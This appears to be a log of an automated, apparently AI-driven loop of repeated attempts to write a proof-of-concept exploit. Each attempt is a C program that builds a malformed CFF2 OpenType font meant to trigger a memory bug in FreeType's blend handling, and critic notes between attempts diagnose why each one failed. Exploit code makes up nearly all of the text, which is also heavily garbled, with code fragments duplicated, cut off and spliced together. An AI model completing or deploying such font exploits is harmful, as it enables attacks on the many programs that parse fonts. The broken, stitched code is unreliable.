**Extracted PoC:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_f2dot14(FILE *f, double v) {
    int16_t val = (int16_t)(v * 16384.0);
    write_uint16(f, (uint16_t)val);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* ========== OpenType header ========== */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f); /* sfVersion */
    write_uint16(f, 1);  /* numTables */
    write_uint16(f, 0);  /* searchRange */
    write_uint16(f, 0);  /* entrySelector */
    write_uint16(f, 0);  /* rangeShift */

    /* Table record for 'CFF2' */
    fputc('C', f); fputc('F', f); fputc('F', f); fputc('2', f); /* tag */
    write_uint32(f, 0); /* checksum placeholder */
    long offset_pos = ftell(f);
    write_uint32(f, 0); /* offset placeholder */
    write_uint32(f, 0); /* length placeholder */

    /* ========== CFF2 data ========== */
    long cff2_start = ftell(f);

    /* CFF2 Header */
    fputc(0x02, f); /* major version */
    fputc(0x00, f); /* minor version */
    fputc(0x05, f); /* header size */
    fputc(0x01, f); /* offSize */

    /* topDictLength - placeholder, will patch later */
    long tdl_pos = ftell(f);
    write_uint16(f, 0);

    /* Top DICT */
    long topdict_start = ftell(f);

    /* FDArray operator (12 36) with offset to FDArray INDEX */
    /* We'll push the offset value */
    /* offset will be from start of CFF2 data */
    long fdarray_offset = 0; /* computed later */

    /* We'll write the FDArray operator with a placeholder offset, then patch */
    /* Use 3-byte integer encoding: 28 <b1> <b2> <b3> for 24-bit value */
    /* But we need to know the offset now. Let's compute structure first. */

    /* Actually, let's write the Top DICT first, then FDArray after Private DICT */
    /* Top DICT: just FDArray (12 36) pointing to FDArray INDEX */
    /* We'll write a placeholder for the offset, then patch after we know it */

    /* For now, write minimal Top DICT: Version (0), FDArray */
    /* Push 0 for version */
    fputc(0x8B, f); /* 0 */
    fputc(0x00, f); /* operator 0 = version (SID) */

    /* FDArray: push offset, then 12 36 */
    /* offset placeholder: 5 bytes (28 + 4 bytes) */
    long fdarray_offset_pos = ftell(f);
    fputc(0x28, f); /* 4-byte integer prefix */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* placeholder */
    fputc(0x0C, f); /* escape */
    fputc(0x24, f); /* FDArray = 12 36 */

    long topdict_end = ftell(f);
    long topdict_len = topdict_end - topdict_start;

    /* Patch topDictLength */
    fseek(f, tdl_pos, SEEK_SET);
    write_uint16(f, (uint16_t)topdict_len);
    fseek(f, topdict_end, SEEK_SET);

    /* Now write Global Subr INDEX (empty) */
    write_uint32(f, 0); /* count = 0 */

    /* Now write FDArray INDEX */
    long fdarray_start = ftell(f);
    long fdarray_offset_from_cff2 = fdarray_start - cff2_start;

    /* Patch FDArray offset in Top DICT */
    fseek(f, fdarray_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((fdarray_offset_from_cff2 >> 24) & 0xff, f);
    fputc((fdarray_offset_from_cff2 >> 16) & 0xff, f);
    fputc((fdarray_offset_from_cff2 >> 8) & 0xff, f);
    fputc(fdarray_offset_from_cff2 & 0xff, f);
    fseek(f, fdarray_start, SEEK_SET);

    /* FDArray INDEX (CFF2: 32-bit count) */
    write_uint32(f, 1); /* 1 Font DICT */

    /* offSize */
    fputc(0x01, f);

    /* offsets: 1-based, so offset[0]=1, offset[1]=1+fontdict_len */
    fputc(0x01, f); /* offset[0] = 1 */

    /* Font DICT data */
    long fontdict_start = ftell(f);

    /* Private DICT operator: <size> <offset> 18 */
    /* We need to know Private DICT offset from start of CFF2 data */
    /* Write placeholder for Private DICT offset */
    long private_offset_pos = ftell(f);
    /* Push size (will be small) */
    fputc(0x8B, f); /* push 0 for size placeholder */
    /* Push offset placeholder using 5-byte encoding */
    fputc(0x28, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x12, f); /* Private operator */

    long fontdict_end = ftell(f);
    long fontdict_len = fontdict_end - fontdict_start;

    /* Patch FDArray offset[1] */
    fseek(f, fontdict_start - 1, SEEK_SET);
    fputc((uint8_t)(fontdict_len + 1), f);
    fseek(f, fontdict_end, SEEK_SET);

    /* Now write Private DICT */
    long private_start = ftell(f);
    long private_offset_from_cff2 = private_start - cff2_start;

    /* Patch Private DICT offset in Font DICT */
    fseek(f, private_offset_pos, SEEK_SET);
    fputc(0x8B, f); /* size = 0 (placeholder, will be patched later) */
    fputc(0x28, f);
    fputc((private_offset_from_cff2 >> 24) & 0xff, f);
    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_start, SEEK_SET);

    /* Private DICT content: blend operator with operands to trigger realloc */
    /* We need two consecutive blend operators. Each blend needs: 
       numBlends (n) and then n pairs of (value, blend_delta) */
    /* First blend: push 2 (numBlends), then push values and deltas */
    fputc(0x8D, f); /* push 2 */
    /* Push 4 values: 2 base values and 2 blend deltas */
    fputc(0x8B, f); /* push 0 */
    fputc(0x8B, f); /* push 0 */
    fputc(0x8B, f); /* push 0 */
    fputc(0x8B, f); /* push 0 */
    fputc(0x0C, f); /* escape */
    fputc(0x16, f); /* blend operator (12 22) */

    /* Second blend: push 2 (numBlends), then push values and deltas */
    fputc(0x8D, f); /* push 2 */
    fputc(0x8B, f); /* push 0 */
    fputc(0x8B, f); /* push 0 */
    fputc(0x8B, f); /* push 0 */
    fputc(0x8B, f); /* push 0 */
    fputc(0x0C, f); /* escape */
    fputc(0x16, f); /* blend operator (12 22) */

    long private_end = ftell(f);
    long private_len = private_end - private_start;

    /* Patch Private DICT size in Font DICT */
    fseek(f, private_offset_pos, SEEK_SET);
    fputc((uint8_t)(private_len + 139), f); /* push private_len */
    fputc(0x28, f);
    fputc((private_offset_from_cff2 >> 24) & 0xff, f);
    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_end, SEEK_SET);

    /* Now write VariationStore */
    /* VariationStore header */
    write_uint16(f, 1); /* format = 1 */
    /* variationRegionListOffset: offset from start of VariationStore to VariationRegionList */
    long vs_start = ftell(f);
    /* We'll write placeholder for variationRegionListOffset */
    long vrlo_pos = ftell(f);
    write_uint32(f, 0); /* placeholder */
    write_uint16(f, 1); /* itemVariationDataCount = 1 */
    long ivdo_pos = ftell(f);
    write_uint32(f, 0); /* placeholder for ItemVariationData offset */

    /* VariationRegionList */
    long vrl_start = ftell(f);
    long vrl_offset = vrl_start - vs_start;
    /* Patch variationRegionListOffset */
    fseek(f, vrlo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)vrl_offset);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1); /* axisCount = 1 */
    write_uint16(f, 1); /* regionCount = 1 */
    /* Region: axisIndex=0, start=0.0, peak=1.0, end=1.0 */
    write_uint16(f, 0); /* axisIndex */
    write_f2dot14(f, 0.0); /* start */
    write_f2dot14(f, 1.0); /* peak */
    write_f2dot14(f, 1.0); /* end */

    /* ItemVariationData */
    long ivd_start = ftell(f);
    long ivd_offset = ivd_start - vs_start;
    /* Patch ItemVariationData offset */
    fseek(f, ivdo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)ivd_offset);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1); /* itemCount = 1 */
    write_uint16(f, 0); /* shortDeltaCount = 0 */
    write_uint16(f, 1); /* regionIndexCount = 1 */
    write_uint16(f, 0); /* regionIndexes[0] = 0 */
    /* Delta data: 1 item, 1 region, so 1 delta (short) */
    write_uint16(f, 0); /* delta = 0 */

    long cff2_end = ftell(f);
    long cff2_len = cff2_end - cff2_start;

    /* Patch OpenType table record */
    fseek(f, offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)cff2_start);
    write_uint32(f, (uint32_t)cff2_len);

    fclose(f);
    return 0;
}

**Feedback to next attempt:**
```
The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
## Final Analysis

Based on the fuzzer source (`ftfuzzer.cc`), I can see that `LLVMFuzzerTestOneInput` uses `FT_New_Memory_Face` to load the input data **directly** as a raw font file, not via libarchive. The `parse_data` function treats the input as a raw tar archive if it starts with a tar header; otherwise it falls back to using the data directly as a single file. Since the input doesn't have a tar header, it's used as-is.

The key insight: The fuzzer calls `FT_New_Memory_Face` with the raw data at face index 0, then iterates over all glyphs calling `FT_Load_Glyph`. To reach the vulnerable `cff_blend_doBlend` function, the font must be a **CFF2 font** (OpenType with CFF2 table) that defines a `Private DICT
```

    /* Patch FDArray offset[1] */

    /* Patch Private DICT offset in Font DICT */
    fseek(f, private_offset_pos, SEEK_SET);

    fputc(0x12, f);
    fseek(f, private_start, SEEK_SET);

    /* Private DICT: two consecutive blend operators */
    /* First blend: numBlends=2, then 2 pairs (value, delta) */
    fputc(0x8D, f); /* push 2 */
    fputc(0x8B, f); /* push 0 (value1) */
    fputc(0x8B, f); /* push 0 (delta1) */
    fputc(0x8B, f); /* push 0 (value2) */
    fputc(0x8B, f); /* push 0 (delta2) */
    fputc(0x0C, f); /* escape */
    fputc(0x16, f); /* blend = 12 22 */

    /* Second blend: numBlends=2, then 2 pairs */
    fputc(0x8D, f); /* push 2 */
    fputc(0x8B, f); /* push 0 (value1) */
    fputc(0x8B, f); /* push 0 (delta1) */
    fputc(0x8B, f); /* push 0 (value2) */
    fputc(0x8B, f); /* push 0 (delta2) */
    fputc(0x0C, f); /* escape */
    fputc(0x16, f); /* blend = 12 22 */

    long private_end = ftell(f);
    long private_len = private_end - private_start;

    /* Patch Private DICT size in Font DICT */
    fseek(f, private_offset_pos, SEEK_SET);
    fputc((uint8_t)(private_len + 139), f); /* push private_len */
    fputc(0x28, f);
    fputc((private_offset_from_cff2 >> 24) & 0xff, f);
    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_end, SEEK_SET);

    /* ========== VariationStore ========== */
    write_uint16(f, 1); /* format = 1 */
    long vs_start = ftell(f);
    long vrlo_pos = ftell(f);
    write_uint32(f, 0); /* variationRegionListOffset placeholder */
    write_uint16(f, 1); /* itemVariationDataCount = 1 */
    long ivdo_pos = ftell(f);
    write_uint32(f, 0); /* ItemVariationData offset placeholder */

    /* VariationRegionList */
    long vrl_start = ftell(f);
    long vrl_offset = vrl_start - vs_start;
    fseek(f, vrlo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)vrl_offset);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1); /* axisCount = 1 */
    write_uint16(f, 1); /* regionCount = 1 */
    write_uint16(f, 0); /* axisIndex = 0 */
    write_f2dot14(f, 0.0); /* start */
    write_f2dot14(f, 1.0); /* peak */
    write_f2dot14(f, 1.0); /* end */

    /* ItemVariationData */
    long ivd_start = ftell(f);
    long ivd_offset = ivd_start - vs_start;
    fseek(f, ivdo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)ivd_offset);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1); /* itemCount = 1 */
    write_uint16(f, 0); /* shortDeltaCount = 0 */
    write_uint16(f, 1); /* regionIndexCount = 1 */
    write_uint16(f, 0); /* regionIndexes[0] = 0 */
    write_uint16(f, 0); /* delta = 0 */

    long cff2_end = ftell(f);
    long cff2_len = cff2_end - cff2_start;

    /* Patch OpenType table record */
    fseek(f, offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)cff2_start);
    write_uint32(f, (uint32_t)cff2_len);

    fclose(f);
    return 0;
}

#include <stdio.h>

#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_f2dot14(FILE *f, double v) {
    int16_t val = (int16_t)(v * 16384.0);
    write_uint16(f, (uint16_t)val);
}

    if (!f) { perror("fopen"); return 1; }

    if (!f) { perror("fopen"); return 1; }

    fseek(f, tdl_pos, SEEK_SET);
    write_uint16(f, (uint16_t)topdict_len);
    fseek(f, topdict_end, SEEK_SET);

    fputc((fdselect_offset_from_cff2 >> 24) & 0xff, f);
    fputc((fdselect_offset_from_cff2 >> 16) & 0xff, f);
    fputc((fdselect_offset_from_cff2 >> 8) & 0xff, f);

    /* ========== CharStrings INDEX ========== */
    long charstrings_start = ftell(f);
    long charstrings_offset_from_cff2 = charstrings_start - cff2_start;

    fseek(f, charstrings_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((charstrings_offset_from_cff2 >> 24) & 0xff, f);
    fputc((charstrings_offset_from_cff2 >> 16) & 0xff, f);
    fputc((charstrings_offset_from_cff2 >> 8) & 0xff, f);
    fputc(charstrings_offset_from_cff2 & 0xff, f);
    fseek(f, charstrings_start, SEEK_SET);

    /* CharStrings INDEX: 1 glyph */
    write_uint32(f, 1); /* count = 1 */
    fputc(0x01, f);     /* offSize = 1 */
    fputc(0x01, f);     /* offset[0] = 1 */
    fputc(0x8B, f);     /* push 0 */
    fputc(0x0E, f);     /* endchar = 14 */

    /* ========== FDArray INDEX ========== */
    long fdarray_start = ftell(f);
    long fdarray_offset_from_cff2 = fdarray_start - cff2_start;

    fseek(f, fdarray_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((fdarray_offset_from_cff2 >> 24) & 0xff, f);
    fputc((fdarray_offset_from_cff2 >> 16) & 0xff, f);
    fputc((fdarray_offset_from_cff2 >> 8) & 0xff, f);
    fputc(fdarray_offset_from_cff2 & 0xff, f);
    fseek(f, fdarray_start, SEEK_SET);

    /* FDArray INDEX: 1 Font DICT */
    write_uint32(f, 1); /* count = 1 */
    fputc(0x01, f);     /* offSize = 1 */
    fputc(0x01, f);     /* offset[0] = 1 */

    long fontdict_start = ftell(f);

    /* Private DICT operator */
    long private_offset_pos = ftell(f);
    fputc(0x8B, f); /* size placeholder (will push 0) */
    fputc(0x28, f); /* offset placeholder */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x12, f); /* Private operator */

    long fontdict_end = ftell(f);
    long fontdict_len = fontdict_end - fontdict_start;

    fseek(f, fontdict_start - 1, SEEK_SET);
    fputc((uint8_t)(fontdict_len + 1), f);
    fseek(f, fontdict_end, SEEK_SET);

    /* ========== Private DICT ========== */
    long private_start = ftell(f);
    long private_offset_from_cff2 = private_start - cff2_start;

    fseek(f, private_offset_pos, SEEK_SET);
    fputc(0x8B, f); /* size placeholder */
    fputc(0x28, f);
    fputc((private_offset_from_cff2 >> 24) & 0xff, f);
    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_start, SEEK_SET);

    /* Private DICT: vsindex 0 */
    fputc(0x8B, f); /* push 0 */
    fputc(0x0C, f); /* escape */
    fputc(0x1F, f); /* vsindex = 12 31 */

    /* First blend: numBlends=101, then 101 pairs (value, delta) */
    /* 101 = 0x65, which is less than 108, so use single-byte encoding: 101+139=240=0xF0 */
    fputc(0xF0, f); /* push 101 */
    int i;
    for (i = 0; i < 101; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */
    }
    fputc(0x0C, f); /* escape */
    fputc(0x16, f); /* blend = 12 22 */

    /* Second blend: numBlends=101, then 101 pairs */
    fputc(0xF0, f); /* push 101 */
    for (i = 0; i < 101; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */
    }
    fputc(0x0C, f); /* escape */
    fputc(0x16, f); /* blend = 12 22 */

    long private_end = ftell(f);
    long private_len = private_end - private_start;

    /* Patch Private DICT size */
    fseek(f, private_offset_pos, SEEK_SET);
    fputc((uint8_t)(private_len + 139), f); /* push private_len */
    fputc(0x28, f);
    fputc((private_offset_from_cff2 >> 24) & 0xff, f);
    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_end, SEEK_SET);

    /* ========== VariationStore ========== */
    write_uint16(f, 1); /* format = 1 */
    long vs_start = ftell(f);
    long vrlo_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1); /* itemVariationDataCount = 1 */
    long ivdo_pos = ftell(f);
    write_uint32(f, 0);

    long vrl_start = ftell(f);
    long vrl_offset = vrl_start - vs_start;
    fseek(f, vrlo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)vrl_offset);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1); /* axisCount = 1 */
    write_uint16(f, 1); /* regionCount = 1 */
    write_uint16(f, 0); /* axisIndex */
    write_f2dot14(f, 0.0);
    write_f2dot14(f, 1.0);
    write_f2dot14(f, 1.0);

    long ivd_start = ftell(f);
    long ivd_offset = ivd_start - vs_start;
    fseek(f, ivdo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)ivd_offset);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1); /* itemCount = 1 */
    write_uint16(f, 0); /* shortDeltaCount = 0 */
    write_uint16(f, 1); /* regionIndexCount = 1 */
    write_uint16(f, 0); /* regionIndexes[0] = 0 */
    write_uint16(f, 0); /* delta = 0 */

    long cff2_end = ftell(f);
    long cff2_len = cff2_end - cff2_start;

    fseek(f, offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)cff2_start);
    write_uint32(f, (uint32_t)cff2_len);

    fclose(f);
    return 0;
}

```
The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
## Final Analysis

### Root Cause

The PoC failed because the generated font is **not a valid OpenType variable font**. The CFF2 `blend` operator is only processed when the font has an `fvar` table (the OpenType table that defines variation axes). Without `fvar`, FreeType's CFF driver treats the font as static and **never enters the glyph loading path that triggers CFF2 blend processing**.

### Execution Path

The fuzzer (`ftfuzzer.cc`) calls `FT_New_Memory_Face`, which eventually loads and parses the CFF2 table. However, `cff_blend_doBlend` is only called during **glyph loading** (`FT_Load_Glyph`), and even then only for glyphs whose CharString contains a `blend` operator. But more critically, the CFF2 drive
```

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_fixed(FILE *f, double v) {
    int32_t val = (int32_t)(v * 65536.0);
    write_uint32(f, (uint32_t)val);
}

static void write_f2dot14(FILE *f, double v) {
    int16_t val = (int16_t)(v * 16384.0);
    write_uint16(f, (uint16_t)val);
}

**Feedback to next attempt:**
```
The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
[CRITIC WARNING] The critic attempted to rewrite the generator code instead of providing diagnostic analysis. Focus on understanding WHY the payload failed, not on writing replacement code.

## Root Cause Analysis

The previous PoC failed because **the Private DICT parser's operand stack was too small** to hold the arguments for the blend operator, causing a `Stack_Overflow` before `cff_blend_doBlend` was ever reached.

**Specific failure mechanism:**

1. In `cffload.c`, when loading a CFF2 Private DICT, the parser stack size is set from `font->top_font.font_dict.maxstack` (line 1862). The default is `CFF2_DEFAULT_STACK = 193`.

2. The PoC sets `maxstack = 200` in the Top DICT (operator `12 30`). This is corr
```

</details>

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_fixed(FILE *f, double v) {
    int32_t val = (int32_t)(v * 65536.0);
    write_uint32(f, (uint32_t)val);
}

static void write_f2dot14(FILE *f, double v) {
    int16_t val = (int16_t)(v * 16384.0);
    write_uint16(f, (uint16_t)val);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* ========== OpenType header ========== */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f); /* sfVersion = 'OTTO' */
    write_uint16(f, 2);  /* numTables = 2 */
    write_uint16(f, 0);  /* searchRange */
    write_uint16(f, 0);  /* entrySelector */
    write_uint16(f, 0);  /* rangeShift */

    /* ========== Table 1: CFF2 ========== */

    write_uint32(f, 0); /* checksum placeholder */
    long cff2_offset_pos = ftell(f);
    write_uint32(f, 0); /* offset placeholder */
    write_uint32(f, 0); /* length placeholder */

    /* ========== CFF2 data ========== */
    long cff2_start = ftell(f);

    fputc(0x00, f); /* minor */
    fputc(0x05, f); /* hdrSize */

    fputc(0x1E, f); /* FDSelect = 12 30 */

    fputc(0x0C, f); /* escape */
    fputc(0x24, f); /* FDArray = 12 36 */

    long topdict_len = topdict_end - topdict_start;

    /* Patch topDictLength */

    write_uint16(f, (uint16_t)topdict_len);

    fputc(0x28, f);

    fputc((fdselect_offset_from_cff2 >> 16) & 0xff, f);
    fputc((fdselect_offset_from_cff2 >> 8) & 0xff, f);

        fputc(0x8B, f); /* push 0 (delta) */

    fputc(0x0C, f); /* escape */
    fputc(0x16, f); /* blend = 12 22 */

    /* Second blend: numBlends=101, then 101 pairs */
    fputc(0xF0, f); /* push 101 */
    for (i = 0; i < 101; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */
    }
    fputc(0x0C, f); /* escape */
    fputc(0x16, f); /* blend = 12 22 */

    long private_end = ftell(f);
    long private_len = private_end - private_start;

    /* Patch Private DICT size */
    fseek(f, private_offset_pos, SEEK_SET);

    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_end, SEEK_SET);

    /* ========== VariationStore ========== */
    write_uint16(f, 1); /* format = 1 */

    long vrlo_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1); /* itemVariationDataCount = 1 */
    long ivdo_pos = ftell(f);
    write_uint32(f, 0);

    long vrl_start = ftell(f);
    long vrl_offset = vrl_start - vs_start;
    fseek(f, vrlo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)vrl_offset);
    fseek(f, vrl_start, SEEK_SET);

    write_uint32(f, (uint32_t)ivd_offset);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1); /* regionIndexCount = 1 */
    write_uint16(f, 0); /* regionIndexes[0] = 0 */
    write_uint16(f, 0); /* delta = 0 */

    long cff2_len = cff2_end - cff2_start;

    /* Patch CFF2 table record */
    fseek(f, cff2_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)cff2_start);
    write_uint32(f, (uint32_t)cff2_len);

    /* ========== Table 2: fvar ========== */
    fputc('f', f); fputc('v', f); fputc('a', f); fputc('r', f); /* tag */
    write_uint32(f, 0); /* checksum placeholder */

    write_uint32(f, 0); /* offset placeholder */
    write_uint32(f, 0); /* length placeholder */

    /* fvar table */
    long fvar_start = ftell(f);
    write_uint32(f, 0x00010000); /* version 1.0 */
    write_uint16(f, 20); /* axes array size (one axis = 20 bytes) */

    write_uint16(f, 0);  /* instance size = 0 */

    /* Axis record: 'wght' */

    write_fixed(f, 1.0);  /* min */
    write_fixed(f, 1.0);  /* default */
    write_fixed(f, 1.0);  /* max */
    write_uint16(f, 0);   /* flags */
    write_uint16(f, 0);   /* axisNameID */

    long fvar_end = ftell(f);
    long fvar_len = fvar_end - fvar_start;

    fseek(f, fvar_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)fvar_start);
    write_uint32(f, (uint32_t)fvar_len);

    fclose(f);
    return 0;

The correct encoding for 513 is `0x1C 0x02 0x01` (high=0x02, low=0x01)....

    fseek(f, private_offset_pos, SEEK_SET);
    fputc(0x8B, f); /* size placeholder */
    fputc(0x28, f);
    fputc((private_offset_from_cff2 >> 24) & 0xff, f);
    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_start, SEEK_SET);

    /* Private DICT: vsindex 0 */
    fputc(0x8B, f); /* push 0 */
    fputc(0x0C, f); /* escape */
    fputc(0x1F, f); /* vsindex = 12 31 */

    /* First blend: numBlends=101, then 101 pairs */
    fputc(0xF0, f); /* push 101 */
    int i;
    for (i = 0; i < 101; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */
    }
    fputc(0x0C, f); /* escape */
    fputc(0x16, f); /* blend = 12 22 */

    /* Second blend: numBlends=101, then 101 pairs */
    fputc(0xF0, f); /* push 101 */
    for (i = 0; i < 101; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */
    }
    fputc(0x0C, f); /* escape */
    fputc(0x16, f); /* blend = 12 22 */

    long private_end = ftell(f);
    long private_len = private_end - private_start;

    /* Patch Private DICT size */
    fseek(f, private_offset_pos, SEEK_SET);
    fputc((uint8_t)(private_len + 139), f); /* push private_len */
    fputc(0x28, f);
    fputc((private_offset_from_cff2 >> 24) & 0xff, f);
    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_end, SEEK_SET);

    /* ========== VariationStore ========== */
    write_uint16(f, 1); /* format = 1 */
    long vs_start = ftell(f);
    long vrlo_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1); /* itemVariationDataCount = 1 */
    long ivdo_pos = ftell(f);
    write_uint32(f, 0);

    long vrl_start = ftell(f);
    long vrl_offset = vrl_start - vs_start;
    fseek(f, vrlo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)vrl_offset);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1); /* axisCount = 1 */
    write_uint16(f, 1); /* regionCount = 1 */
    write_uint16(f, 0); /* axisIndex */
    write_f2dot14(f, 0.0);
    write_f2dot14(f, 1.0);
    write_f2dot14(f, 1.0);

    long ivd_start = ftell(f);
    long ivd_offset = ivd_start - vs_start;
    fseek(f, ivdo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)ivd_offset);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1); /* itemCount = 1 */
    write_uint16(f, 0); /* shortDeltaCount = 0 */
    write_uint16(f, 1); /* regionIndexCount = 1 */
    write_uint16(f, 0); /* regionIndexes[0] = 0 */
    write_uint16(f, 0); /* delta = 0 */

    long cff2_end = ftell(f);
    long cff2_len = cff2_end - cff2_start;

    /* Patch CFF2 table record */
    fseek(f, cff2_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)cff2_start);
    write_uint32(f, (uint32_t)cff2_len);

    /* ========== Table 2: fvar ========== */
    fputc('f', f); fputc('v', f); fputc('a', f); fputc('r', f); /* tag */
    write_uint32(f, 0); /* checksum placeholder */
    long fvar_offset_pos = ftell(f);
    write_uint32(f, 0); /* offset placeholder */
    write_uint32(f, 0); /* length placeholder */

    /* fvar table */
    long fvar_start = ftell(f);
    write_uint32(f, 0x00010000); /* version 1.0 */
    write_uint16(f, 20); /* axes array size (one axis = 20 bytes) */
    write_uint16(f, 0);  /* instance count = 0 */
    write_uint16(f, 0);  /* instance size = 0 */

    /* Axis record: 'wght' */
    fputc('w', f); fputc('g', f); fputc('h', f); fputc('t', f);
    write_fixed(f, 1.0);  /* min */
    write_fixed(f, 1.0);  /* default */
    write_fixed(f, 1.0);  /* max */
    write_uint16(f, 0);   /* flags */
    write_uint16(f, 0);   /* axisNameID */

    long fvar_end = ftell(f);
    long fvar_len = fvar_end - fvar_start;

    fseek(f, fvar_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)fvar_start);
    write_uint32(f, (uint32_t)fvar_len);

    fclose(f);
    return 0;
}

From `cfftoken.h`, the CFF2 opcodes are:

| Operator   | CFF2 Code | Byte Value | PoC used (CFF1-style) |
|------------|-----------|------------|------------------------|
| maxstack   | 25        | `0x19`     | `0x0C 0x1E` (escape 12 30) |
| vsindex    | 22        | `0x16`     | `0x0C 0x1F` (escape 12 31) |
| blend      | 23        | `0x17`     | `0x0C 0x16` (escape 12 22) |

When the parser sees the escaped sequences (0x0C prefix), it computes `code = 0x100 | second_byte` and looks up the CFF2_CODE_PRIVATE field handler table. That table cont

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
